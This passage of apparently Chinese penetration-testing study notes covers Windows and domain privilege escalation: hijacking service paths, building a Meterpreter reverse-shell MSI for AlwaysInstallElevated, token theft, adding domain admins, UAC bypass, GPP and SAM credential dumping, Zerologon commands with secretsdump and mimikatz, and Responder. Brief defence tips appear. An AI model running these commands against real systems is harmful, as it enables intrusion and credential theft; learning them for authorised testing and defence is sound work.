<p><code>REG_EXPAND_SZ /d &quot;cmd.exe /k C:\Users\Public\reverse_tcp.exe&quot; /f</code></p>
<p>检测用户对服务有无重启权限</p>
<p><code>accesschk.exe /acceptula -ucqv &quot;Authenticated Users&quot; xyz</code></p>
<h3 id="服务路径权限可控"><a href="#服务路径权限可控" class="headerlink" title="服务路径权限可控"></a>服务路径权限可控</h3><p>主机用户存在错误配置或操作 使得低权用户对其调用的二进制文件或所在目录有写入权限 可以将文件换成攻击载荷</p>
<p>查看InexeSvc服务的二进制文件所在目录是否有写入权限</p>
<p><code>accesschk.exe /acceptula -quv &quot;C:\Program Files\Insecure Executables\&quot;</code></p>
<p>如果有 可以备份原来二进制文件 并上传同名的 攻击载荷 随着服务重启 继承系统权限</p>
<h3 id="未引用服务路径"><a href="#未引用服务路径" class="headerlink" title="未引用服务路径"></a>未引用服务路径</h3><p>Windows文件解析特性 启动执行二进制文件路径种包含空格 未能有效包含在引号里</p>
<p>执行命令 枚举目标主机所有该漏洞</p>
<p><code>wmic service get DisplayName, PathName, StartMode|findstr /i /v &quot;C:\Windows\\&quot; |findstr/i /v &quot;&quot;&quot;</code></p>
<p><img src="image-20230313140448452.png" alt="image-20230313140448452"></p>
<p>结果知 用accesschk检查受影响目录 发现有当前用户对目录有完全控制权限</p>
<p><img src="image-20230313142216754.png" alt="image-20230313142216754"></p>
<p>此时可以想目录上传一个  Sub.exe载荷 服务重启后 检查到  、/xxx/xxx/Sub.exe会 以system权限执行</p>
<p>为避免漏洞 使用sc创建系统服务 应有效对存在空格的服务路径使用引号包裹</p>
<p>example<code>sc create TestSvc binpath= &quot;\&quot;C&quot;\Program Files\Sub Dir\Program Name.exe\&quot;&quot;</code></p>
<ul>
<li>icacls “C:\program Files\program folder”` 查看文件权限</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Everyone: 用户对这个文件夹有完全控制权限</span><br><span class="line">M：修改</span><br><span class="line">F：完全控制</span><br><span class="line">CI：从属容器将继承访问控制项</span><br><span class="line">OI：从属文件将继承访问控制项</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sc stop service_name //停止服务</span><br><span class="line">sc start service_name //启动服务</span><br></pre></td></tr></table></figure>

<ul>
<li>可以使用<code>MSF</code>的<code>Windows Service Trusted Path Privilege Escalation</code>模块</li>
</ul>
<h3 id="自动安装配置文件"><a href="#自动安装配置文件" class="headerlink" title="自动安装配置文件"></a>自动安装配置文件</h3><p>网络管理员在内网中给多台机器配置同一个环境时，通常会使用脚本批量部署，在这一过程中，会使用安装配置文件。这些文件包含所有的安装配置信息，其中的一些还有可能包含本地管理员账号和密码等信息。这些文件包含但不限于：</p>
<ul>
<li>C:\sysprep.inf</li>
<li>C:\sysprep\sysprep.inf</li>
<li>C:\Windows\system32\sysprep.inf</li>
<li>C:\Windows\system32\sysprep\sysprep.xml</li>
<li>C:\unattend.xml</li>
<li>C:\Windows\Panther\Unattend.xml</li>
<li>C:\Windows\Panther\Unattended.xml</li>
<li>C:\Windows\Panther\Unattend\Unattended.xml</li>
<li>C:\Windows\Panther\Unattend\Unattend.xml</li>
<li>C:\Windows\System32\Sysprep\unattend.xml</li>
<li>C:\Windows\System32\Sysprep\Panther\unattend.xml</li>
</ul>
<p>里面大概率包含明文密码或者经过Base64加密的密码</p>
<p><code>MSF</code>的<code>post/windwos/gather/enum_unattend</code>模块集成</p>
<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><ul>
<li><code>schtasks /query /fo LIST /v</code> 查看计算机所有的计划任务</li>
<li>如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用恶意程序覆盖原来的程序。这样在计划任务下次执行时，就会以高权限来运行恶意程序</li>
</ul>
<h3 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h3><p><a target="_blank" rel="noopener" href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp">https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp</a></p>
<p>暂时不会用  这玩意要和powershell一块用  </p>
<h2 id="MSI安装策略提权"><a href="#MSI安装策略提权" class="headerlink" title="MSI安装策略提权"></a>MSI安装策略提权</h2><p>配置策略时   启用了永远以高特权进行安装（AlwaysInstallElevated 默认是禁用）使得任何权限用户都可以使用SYSTEM权限安装MSI程序     MSI=Microsoft Installer 微软格式应用程序安装包</p>
<p>在“运行”设置框中输入“gpedit.msc”，打开组策略编辑器</p>
<ul>
<li><p>组策略——计算机配置——管理模板——Windows 组件——Windows Installer —— 永远以高特权进行安装</p>
</li>
<li><p>组策略——用户配置——管理模板——Windows 组件——Windows Installer —— 永远以高特权进行安装</p>
</li>
</ul>
<h3 id="确定是否存在"><a href="#确定是否存在" class="headerlink" title="确定是否存在"></a>确定是否存在</h3><p>注册表以下两位置 键值为 1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\windows\Installer\AlwaysInstallElevated</span><br><span class="line">HKEY_CURRENT_MACHINE\SOFTWARE\Policies\Microsoft\windows\Installer\AlwaysInstallElevated</span><br></pre></td></tr></table></figure>

<p>测试命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br></pre></td></tr></table></figure>

<p><img src="image-20230313144920402.png" alt="image-20230313144920402"></p>
<p>如果没配置过 就是  <img src="image-20230313144947426.png" alt="image-20230313144947426"></p>
<h3 id="创建恶意MSI并安装"><a href="#创建恶意MSI并安装" class="headerlink" title="创建恶意MSI并安装"></a>创建恶意MSI并安装</h3><p>使用 msf <code>msfconsole - p windows/meterpreter/reverse_tcp LHOST=4444 -f msi -o reverse_tcp.msi</code></p>
<p><code>msiexec /q /i reverse_tcp.msi</code></p>
<h3 id="执行MSI文件命令"><a href="#执行MSI文件命令" class="headerlink" title="执行MSI文件命令"></a>执行MSI文件命令</h3><ul>
<li><code>msiexec /q /i UserAdd.msi</code></li>
<li><code>/quite</code>: 在安装过程中禁止像用户发送消息</li>
<li><code>/qn</code>: 不适用GUI，无GUI模式允许</li>
<li><code>/i</code>: 安装程序 常规安装</li>
</ul>
<h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><ul>
<li><code>PowerUp.ps1</code>的<code>RegistryAlwaysInstallElevated</code>和<code>Write-UserAddMSI</code>模块</li>
<li><code>MSF</code>的<code>exploiexploit/windows/local/always_install_elevated</code>模块</li>
</ul>
<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>禁用注册表键<code>AlwaysInstallElevated</code>，就可以组织攻击者通过MSI文件进行提权</p>
<h2 id="访问令牌操作"><a href="#访问令牌操作" class="headerlink" title="访问令牌操作"></a>访问令牌操作</h2><p><strong>令牌特点：</strong></p>
<ul>
<li>除非系统重启，这些令牌将持续存在于系统中</li>
<li>令牌的最大特点时是随机性和不可预测性</li>
<li>伪造令牌攻击的核心是Kerberos协议</li>
</ul>
<p><strong>令牌类型：</strong></p>
<ul>
<li>授权令牌（Delegation Tokens）：它支持交互式登录，例如远程登录和访问</li>
<li>模拟令牌（Impersonation Tokens）：它支持非交互式会话</li>
</ul>
<p>windows访问控制模型 由访问令牌 和安全描述符两部分组成   </p>
<p>访问令牌 登陆验证通过就会创建一个令牌 包括SID和本地安全策略分配给用户和用户属安全组的特权列表 此后每个进程都有此令牌的副本</p>
<p>win中令牌分为主令牌和模拟令牌 主令牌和进程关联</p>
<p>通过操纵访问令牌 使正在运行的进程看起来是其他进程的子进程或属于吉他用户启动的进程 常常使用内置Windows API从指定进程赋值访问令牌 并将得到的访问令牌用于现有进程或生成新进程 达到权限提升并绕过访问控制的目的  成为 令牌窃取 </p>
<p>令牌窃取只能在特权用户上下文才能完成 通过令牌创建进程用的<code>CreateProcessWithTokenW</code>和<code>CreateProcessAsUserA</code>两个API分别要求用户有 <code>SeImpersonatePrivilege</code>和<code>SeAssignPrimaryTokenPrivilege/SeIncreaseQuotaPrivilege</code>特权</p>
<p>拥有此2特权的一般为系统管理员 网络服务 和系统服务账户 （如IIS MSSQL等）</p>
<p>令牌窃取</p>
<p>如果已经存在<code>meterpreter shell</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usr incognito  </span><br><span class="line">list_tokens -u <span class="comment"># 列出可用令牌</span></span><br><span class="line">impersonate_token 主机名\\用户名</span><br></pre></td></tr></table></figure>

<p>如果目标系统中存在有效的令牌，可以通过Rotten Potato，实现权限提升</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upload roottenpotato.exe</span><br><span class="line">excute _HC -f roottenpotato.exe</span><br><span class="line">impersonate_token <span class="string">&quot;NT AUTHORITY\\SYSTEM&quot;</span></span><br></pre></td></tr></table></figure>

<p>添加域管理员提权</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 前提获得域管理员进程</span></span><br><span class="line">ps <span class="comment"># 查看当前进程</span></span><br><span class="line">migrate <span class="comment"># 迁移到域管理员进程</span></span><br><span class="line">shell <span class="comment"># 进入命令行界面</span></span><br><span class="line">net user &lt;用户名&gt; &lt;密码&gt; /ad /domain <span class="comment"># 添加域用户</span></span><br><span class="line">net group <span class="string">&quot;domain admins&quot;</span> &lt;用户名&gt; /ad /domain <span class="comment"># 把域用户添加到管理员组</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当使用meterpreter的incognito模拟域管理员</span></span><br><span class="line">add_user_&lt;用户名&gt; &lt;密码&gt; -h &lt;主机iP&gt; <span class="comment"># 在域控主机添加一个账号</span></span><br><span class="line">add_group_user <span class="string">&quot;Domain admins&quot;</span> &lt;用户名&gt; -h &lt;主机iP&gt; <span class="comment"># 添加到管理员组</span></span><br></pre></td></tr></table></figure>

<p>防御方法</p>
<ul>
<li>及时安装补丁</li>
<li>对令牌时效性进行限制</li>
<li>对令牌采取加密存储和多重验证保护</li>
<li>使用加密链路<code>SSL/TLS</code>传输令牌，以防止中间人窃听</li>
</ul>
<h3 id="常规令牌窃取"><a href="#常规令牌窃取" class="headerlink" title="常规令牌窃取"></a>常规令牌窃取</h3><p>用于将管理员权限提升到<strong>SYSTEM</strong>、<strong>TrustdInstaller</strong>等更高的系统权限</p>
<ul>
<li><code>incognito.exe 可用于有杀毒、不出网、防火墙限制等无法cs或msf上线情况，但是需要管理员的权限运行</code></li>
</ul>
<p>上传到目标主机 <code>incognito.exe list_tokens_u</code> 列举主机上所有访问令牌</p>
<p><img src="image-20230313151559789.png" alt="image-20230313151559789"></p>
<p><code>incognite.exe excute -c &quot;NT AUTHORITY\SYSTEM&quot; whoami</code>         -  c参数后为要窃取的令牌 whoami  窃取后要执行的命令</p>
<p><code>incognito.exe excute -c &quot;HACK-MY\MARCUS&quot; CMD</code>  窃取 Mrcus的访问令牌 实现本地管理员切换到域用户  </p>
<ul>
<li>msf</li>
</ul>
<p>他也有incognito模块   </p>
<ul>
<li>通过令牌获取 TrustInstaller权限</li>
</ul>
<p><code>icacls &quot;C:\Windows\servicing&quot; </code>查看目录权限 （此目录 即使拥有system权限也不能写入文件）</p>
<p><img src="image-20230313152230932.png" alt="image-20230313152230932"></p>
<blockquote>
<p>icacls查看目录权限</p>
</blockquote>
<p>Windows从Vistas开始内置TrustedInstaller安全主体 有修改系统文件的权限 用于对系统维护更新 它以一个帐户组的形式出现-NT SERVICE\TrustedInstaller</p>
<p>通常情况下可以通过窃取令牌获取TrustedInstaller权限 </p>
<p>TrustedInstaller本身也是一个服务 启动 运行 TrustedInstaller.exe  路径”C:\Windows\serivcing\TrustedInstaller.exe”</p>
<p>拥有者  NT SERVICE\TrustedInstaller 可以窃取此令牌提升至TrustedInstaller权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sc start TrustedInstaller</span><br><span class="line">记录pid</span><br><span class="line">steal_token &lt;PID&gt;</span><br><span class="line">chcp 切换 utf-8 防止乱码 </span><br></pre></td></tr></table></figure>



<h3 id="Potato家族提权"><a href="#Potato家族提权" class="headerlink" title="Potato家族提权"></a>Potato家族提权</h3><p>通过操纵访问令牌 提升至SYSTEM权限</p>
<p>滥用   <code>SeImpersonatePrivilege</code>和<code>SeAssignPrimaryTokenPrivilege</code>俩也全 将SYSTEM令牌传入函数调用 从而在SYSTEM账户的上下文创建新进程 提升到SYSTEM 如果拿到了IIS等服务的Webshell 或者通过MSSQL服务的xp_cmdshell成功执行系统命令 此时有俩特权 就可以提升到SYSTEM权限</p>
<ul>
<li>Rotten Potato烂土豆</li>
</ul>
<p>1 通过api将一个com加载到本地可控端口 诱骗BITS对象以system账户身份发起NTLM认证</p>
<p>2.借助rpc135端口进行中间人攻击 生成访问令牌</p>
<p>3 通过令牌创建新进程</p>
<ul>
<li>Juicy Potato 烂土豆的扩展</li>
</ul>
<p>不依赖现有的Meterpreter</p>
<ul>
<li>PrintSpoofer(Pipe Potato)</li>
<li>Sweet Potato 甜土豆</li>
</ul>
<p>集成功能</p>
<h2 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h2><p>如果计算机的操作系统版本是<code>Windows Vista</code>或者更高，低权限访问敏感文件或者目录，需要经过UAC（User Account Control，用户账户控制）的认证才能进行</p>
<p>UAC简介</p>
<p>UAC是微软为了提高系统安全性引入的技术。UAC要求用户在执行可能影响计算机运行的操作或者在进行可能影响其他用户的设置之前，拥有相应的权限或者管理员密码。</p>
<p>需要UAC的授权才能进行的操作列举：</p>
<ul>
<li>配置<code>Windows Update</code></li>
<li>增加/删除账户</li>
<li>更改用户类型</li>
<li>更改UAC的设置</li>
<li>安装<code>ActiveX</code></li>
<li>安装/卸载程序</li>
<li>安装设备驱动程序</li>
<li>将文件移动/复制到<code>Program Files</code>或<code>Windows</code>目录下</li>
<li>查看其他用户文件夹</li>
</ul>
<p>UAC有四种设置：</p>
<ul>
<li>始终通知：这是最严格的设置，每当有程序需要使用高级别的权限是都会提示本地用户</li>
<li>仅在程序试图更改我的计算机时通知我：这是UAC的默认设置。当本地Windows程序要使用高级别权限时，不会通知用户。但是，当第三方程序要使用高级别权限时，会提示本地用户</li>
<li>仅在程序识图更改我的计算机时通知我（不降低桌面的亮度）：与上一条设置的要求想用，但是提示用户是不降低桌面亮度</li>
<li>不提示：当用户为系统管理员时，所有程序都会以最高权限运行</li>
</ul>
<p>Uer Account Control 用户账户控制  UAC</p>
<p>可以阻止自动安装未授权应用</p>
<p>限制所有用户包括非 RID500的管理员（除了Administrator外）的操作 </p>
<p>如果可以绕过 UAC可以使非RID500的管理员账户可以不如要用户批准直接使用管理员访问令牌，获取全部管理权限</p>
<p>本质是绕过UAC的权限保护 本质上不能看做真正的提权</p>
<h3 id="UAC白名单"><a href="#UAC白名单" class="headerlink" title="UAC白名单"></a>UAC白名单</h3><p>设置了白名单 不再询问  可以对这些白名单中的程序进行DLL劫持 注入或注册表劫持</p>
<p>寻找白名单程序 <code>Sigcheck</code> <code>Strings </code> 白名单程序特性 Manifest数据库中 autoElevate属性为true</p>
<p>找到白名单程序A -&gt;使用Process Monitor监控进程操作行为-&gt;修改启动可以执行文件键值-&gt;再次执行该程序A</p>
<h3 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h3><p>很多程序不是完整的 被分割成dll文件 启动时有特定顺序搜索待加载dll 将同名恶意dll但放到合法dll之间的搜索位置 就会加载恶意dll</p>
<h3 id="模拟可信任目录"><a href="#模拟可信任目录" class="headerlink" title="模拟可信任目录"></a>模拟可信任目录</h3><p>根据可信任目录创建一个包含尾随空格的模拟可信任目录 将一个白名单程序复制到模拟可信任目录中 配合dll劫持绕过</p>
<h3 id="相关辅助工具"><a href="#相关辅助工具" class="headerlink" title="相关辅助工具"></a>相关辅助工具</h3><ul>
<li><p>UACME</p>
<p>AKAGI.EXE [KEY] [PARAM] </p>
<p>key指定绕过方法变好 param 指定绕过后的命令</p>
</li>
<li><p>msf</p>
</li>
</ul>
<p>​    bypassuac模块</p>
<p>​     使用<code>MSF</code>，当已经获得一个<code>meterpreter</code>时，运行<code>exploit/windows/local/bypassuac</code>，会获得一个新的<code>meterpreter shell</code>，这时已经绕过了UAC，获得了System权限，<strong>使用该模块必须，当前用户在管理员组，且UAC必须是默认设置</strong></p>
<p>​    该模块会在目标机器创建多个文件，会被杀软识别</p>
<p>​    RunAS模块</p>
<p>​       使用<code>exploit/windwos/local/ask</code>模块，创建一个可执行文件（需要免杀处理），在目标机器会运行一个发起提升权限请求的程序，提示用户是否要继续运行，如果选择是，就会返回一个高权限的<code>meterpreter shell</code></p>
<p>防御方法</p>
<ul>
<li>不让内部机器使用者拥有本地管理员权限</li>
<li>设置UAC为“始终通知”</li>
</ul>
<h2 id="用户凭据操作"><a href="#用户凭据操作" class="headerlink" title="用户凭据操作"></a>用户凭据操作</h2><h3 id="枚举Unattended凭据"><a href="#枚举Unattended凭据" class="headerlink" title="枚举Unattended凭据"></a>枚举Unattended凭据</h3><p>无人值守Unattended 允许自动安装</p>
<p>残留配置文件 可能包含本地管理员用户名密码</p>
<ul>
<li>C:\sysprep.inf</li>
<li>C:\sysprep\sysprep.inf</li>
<li>C:\Windows\system32\sysprep.inf</li>
<li>C:\Windows\system32\sysprep\sysprep.xml</li>
<li>C:\unattend.xml</li>
<li>C:\Windows\Panther\Unattend.xml</li>
<li>C:\Windows\Panther\Unattended.xml</li>
<li>C:\Windows\Panther\Unattend\Unattended.xml</li>
<li>C:\Windows\Panther\Unattend\Unattend.xml</li>
<li>C:\Windows\System32\Sysprep\unattend.xml</li>
<li>C:\Windows\System32\Sysprep\Panther\unattend.xml</li>
</ul>
<p>里面大概率包含明文密码或者经过Base64加密的密码</p>
<p><code>MSF</code>的<code>post/windwos/gather/enum_unattend</code>模块集成自动检索</p>
<h3 id="组策略首选项提权"><a href="#组策略首选项提权" class="headerlink" title="组策略首选项提权"></a>组策略首选项提权</h3><p>简介</p>
<p><code>SYSVOL</code>是活动目录里面的一个用于存储域供供文件服务器副本的共享文件夹，在域中的所有域控制器之间进行复制。它是在安装活跃目录时自动创建的，主要用于存放登录脚本，组策略数据及其他域控制器需要的域信息。<code>SYSVOL</code>在所有经过身份验证的域用户或者域信任用户具有读权限的活动目录的域范围内共享。<strong>整个SYSVOL目录在所有的域控制器中式自动同步共享的，所有域策略均存放在C:\windwos\SYSVOL\DOMAIN\Policies\目录中</strong></p>
<p>通过组策略统一修改密码，虽然强度有所提高，但所有机器的本地管理员密码是相同的。攻击者获得了一台机器的本地管理员面面，就相当于获得了整个域中所有机器的本地管理员密码</p>
<p>常见的组策略首选项：</p>
<ul>
<li>映射驱动器（Drives.xml）</li>
<li>创建本地用户</li>
<li>数据源（DataSources.xml）</li>
<li>打印机配置（Printers.xml）</li>
<li>创建/更新服务（Services.xml）</li>
<li>计划任务（ScheduledTasks.xml）</li>
</ul>
<p>获取组策略的凭据</p>
<p>管理员在域中新建一个组策略后，操作系统会自动在<code>SYSVOL</code>共享目录中生成一个XML文件，该文件中保存了改组策略更新后的密码。改密码使用AES-256加密算法。但是，2012年微软在官方网站上公布了该密码的私钥，导致保存在XML文件中的密码的安全性大大降低。任何域用户和域信任用户均可对该共享目标进行访问，这就意味着，任何用户都可以访问保存在XML文件中的密码并将其破解，从而控制域中所有使用该账号/密码的本地管理员计算机。在SYSVOL中搜素，可以找到包含<code>cpassword</code>的XML文件</p>
<p>查找cpassword文件</p>
<ul>
<li>手动查找SYSVOL文件夹</li>
<li>使用<code>PowerSploit</code>中的<code>Get-GPPPassword.ps1</code></li>
<li>使用<code>MSF</code>中的<code>post/windows/gather/credentials/gpp</code>模块</li>
</ul>
<p>防御方式</p>
<ul>
<li>安装<code>KB2962486</code>补丁，使用该补丁将不会将密码保存在组策略首选项中</li>
<li>设置共享文件夹SYSVOL的访问权限</li>
<li>将cpassword文件删除</li>
<li>不要将密码放在低权限能够访问的文件中</li>
<li>修改域中机器密码使用LAPS</li>
</ul>
<h2 id="HiveNightmare"><a href="#HiveNightmare" class="headerlink" title="HiveNightmare"></a>HiveNightmare</h2><p>CVE-2021-36934</p>
<ul>
<li>是否存在</li>
</ul>
<p>icacls “C:\Windows\System32\config\SAM”</p>
<p>输出 “BUILTIN\Users:(I)(RX)”则表示易受攻击</p>
<ul>
<li><p>将编译好的exe上传到主机 直接运行就可以将  SAM、SYSTEM、SECURITY文件转储到当前目录</p>
</li>
<li><p>三个文件复制到本地 使用Impacket 中的secretsdump.py导出用户哈希</p>
</li>
<li><p>之后可以爆破哈希 或者 哈希传递  </p>
</li>
</ul>
<h2 id="Zerologin域内提权"><a href="#Zerologin域内提权" class="headerlink" title="Zerologin域内提权"></a>Zerologin域内提权</h2><p>cve-2020-1472  Netlogon远程协议特权提升漏洞</p>
<p>调用Netlogon中的RPC函数重置域控密码 重置的是域控机器账户的密码 </p>
<p>机器账户不允许登陆 但默认有DCSync权限 可以导出域管哈希 从何获取域控权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1.充值域控密码</span><br><span class="line">python3 cve.py DC-1 10.10.10.11</span><br><span class="line">python3 secretsdump.py hack-my.com/DC-1\$@10.10.10.11 -just-dc-user &quot;hack-my/administrator&quot; -no-pass</span><br><span class="line">然后哈希传递攻击 </span><br><span class="line">或者mimikatz</span><br><span class="line">mimikatz.exe &quot;lsadump::zerologon /target:10.10.10.11 /ntlm /null /account:DC-1$/exploit&quot; exit </span><br><span class="line">/target指定域控地址 /account指定域控账户</span><br><span class="line">2.恢复域控密码</span><br><span class="line">不恢复会导致域控脱域 因为NTDS.DIT中存储密码和本地注册表存储密码不一致</span><br><span class="line">首先导出本地注册表值</span><br><span class="line">reg save HKLM/SYSTEM system.save</span><br><span class="line">reg save HKLM/SAM sam.save</span><br><span class="line">reg save HKLM/SECURITY security.save</span><br><span class="line">使用secretsdump.py导出哈希值</span><br><span class="line">secretsdump.py -sam sam.save -system system.save -secyrity security.save LOCAL</span><br><span class="line">然后运行cve中的restorepassword.py恢复域控密码</span><br><span class="line">python3  restorepassword.py hack-my.com/DC-1$@DC-1 -target-ip 10.10.10.11 -hexpassea4b</span><br><span class="line">或者mimikatz恢复</span><br><span class="line">lsadump::postzerologin /target:hack-my.com /account:DC-1$</span><br></pre></td></tr></table></figure>



<h2 id="Print-Spooler"><a href="#Print-Spooler" class="headerlink" title="Print Spooler"></a>Print Spooler</h2><p>系统打印后台处理服务 默认开启</p>
<h3 id="PrintDemon"><a href="#PrintDemon" class="headerlink" title="PrintDemon"></a>PrintDemon</h3><p>CVE-2020-1048 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 .MSF生成攻击载荷 并base64编码</span><br><span class="line">2以标准用户身份在目标主机powersploit执行poc</span><br><span class="line">#msf有这个cve模块可以直接提权</span><br></pre></td></tr></table></figure>

<h3 id="PrintNightmare"><a href="#PrintNightmare" class="headerlink" title="PrintNightmare"></a>PrintNightmare</h3><p>CVE-2021-1675 提权</p>
<p>CVE-2021-34527 rce</p>
<h2 id="Nopac域内提权"><a href="#Nopac域内提权" class="headerlink" title="Nopac域内提权"></a>Nopac域内提权</h2><p>kerberos协议有关 待学习</p>
<h2 id="Certifred域内提权"><a href="#Certifred域内提权" class="headerlink" title="Certifred域内提权"></a>Certifred域内提权</h2><p>CVE-2022-26923</p>
<p>原理 域内主机绕过限制 安装AD 成为DC 获取域控最高权限 </p>
<h2 id="无凭证条件下的权限获取"><a href="#无凭证条件下的权限获取" class="headerlink" title="无凭证条件下的权限获取"></a>无凭证条件下的权限获取</h2><p>假设目标网络DNS服务器因故障无法服务可以使用<code>Responder</code>工具进行监听，它能够抓取网络中所有的LLMNR和NBT-NS请求并进行响应，获取最初的账户凭证</p>
<p>它还可以利用内置SMB、MSSQL、HTTP、HTTPS、LDAP、DNS、WPAD、FTP、POP3、LMAP、SMTP等认证服务器，收集目标计算机的凭证，还可以通过Multi-Relay功能在目标系统中执行命令</p>
<h1 id="Windows-Powershell-基础"><a href="#Windows-Powershell-基础" class="headerlink" title="Windows Powershell 基础"></a>Windows Powershell 基础</h1><p><strong>可以把PowerShell 当作是CMD的扩展，它可以执行一些脚本文件，极大的便利了内网渗透</strong></p>
<p><strong>优点：</strong></p>
<ul>
<li><p>在Windows 7 以上的版本默认安装</p>
</li>
<li><p>脚本可以在内存中运行，无需写入内存</p>
</li>
<li><p>几乎不会触发杀毒软件</p>
</li>
<li><p>可以远程执行</p>
</li>
<li><p>目前很多工具多是基于PowerShell开发的</p>
</li>
<li><p>使Windows脚本执行变得更加容易</p>
</li>
<li><p><code>cmd.exe</code>通常会被阻止，但是<code>PowerShell</code>的运行通常不会被阻止</p>
</li>
<li><p>可用于管理活跃目录</p>
</li>
</ul>
<p><strong>Windows版本对应的版本：</strong></p>
<table>
<thead>
<tr>
<th>win版本</th>
<th>PowerShell版本</th>
<th>是否可以升级</th>
</tr>
</thead>
<tbody><tr>
<td>win7/winServer 2008</td>
<td>2.0</td>
<td>3.0 / 4.0</td>
</tr>
<tr>
<td>win8 / winServer 2021</td>
<td>3.0</td>
<td>4.0</td>
</tr>
<tr>
<td>win8.1 / winServer2012R2</td>
<td>4.0</td>
<td>X</td>
</tr>
</tbody></table>
<ul>
<li><code>Get-Host</code> 或者 <code>$PSVersionTable.PSVERSION</code> 查看版本</li>
</ul>
<p><img src="image-20220330095144552.png" alt="image-20220330095144552"></p>
<p><img src="image-20220330095234964.png" alt="image-20220330095234964"></p>
<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><ul>
<li><code>Powershell</code>脚本文件的后缀是<code>.ps1</code></li>
</ul>
<h2 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h2><p>为了防止恶意脚本执行，提供了执行策略，默认策略是”不能运行”</p>
<ul>
<li><p>使用<code>Get-ExecutionPolicy</code>查看执行策略</p>
<ul>
<li><p><code>Restricted</code>：脚本不能执行（默认设置）</p>
</li>
<li><p><code>RemoteSigned:</code>在本地创建的脚本可以运行，网上下载的脚本不能运行（拥有数字签名的证书除外）</p>
</li>
<li><p><code>AllSigned:</code> 仅当脚本有受信任的发布者签名时才能运行</p>
</li>
<li><p><code>Unrestricted:</code>允许所有脚本运行</p>
</li>
</ul>
<p><img src="image-20220330100120858.png" alt="image-20220330100120858"></p>
</li>
<li><p>使用<code>Set-ExecutionPolicy &lt;policy name&gt;</code> 设置执行策略（需要管理员权限）</p>
</li>
</ul>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2> <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-Item</span> &lt;目录名&gt; <span class="literal">-type</span> directory <span class="comment"># 新建目录</span></span><br><span class="line"><span class="built_in">New-Item</span> &lt;文件名&gt; <span class="literal">-type</span> file      <span class="comment"># 新建文件</span></span><br><span class="line"><span class="built_in">Remove-item</span> &lt;目录名/文件名&gt;        <span class="comment"># 删除目录或者文件</span></span><br><span class="line"><span class="built_in">Get-content</span> &lt;文件名&gt;              <span class="comment"># 读取文件内容</span></span><br><span class="line"><span class="built_in">set-content</span> &lt;文件名&gt; <span class="literal">-value</span> <span class="string">&quot;文件内容&quot;</span> <span class="comment"># 覆盖写入文件内容</span></span><br><span class="line"><span class="built_in">add-content</span> &lt;文件名&gt; <span class="literal">-value</span> <span class="string">&quot;文件内容&quot;</span> <span class="comment"># 追加写入文件内容</span></span><br><span class="line"><span class="built_in">clear-content</span> &lt;文件名&gt;            <span class="comment"># 清空文件内容</span></span><br><span class="line"><span class="variable">$host</span>.version  <span class="comment"># 查看powershell版本</span></span><br><span class="line"><span 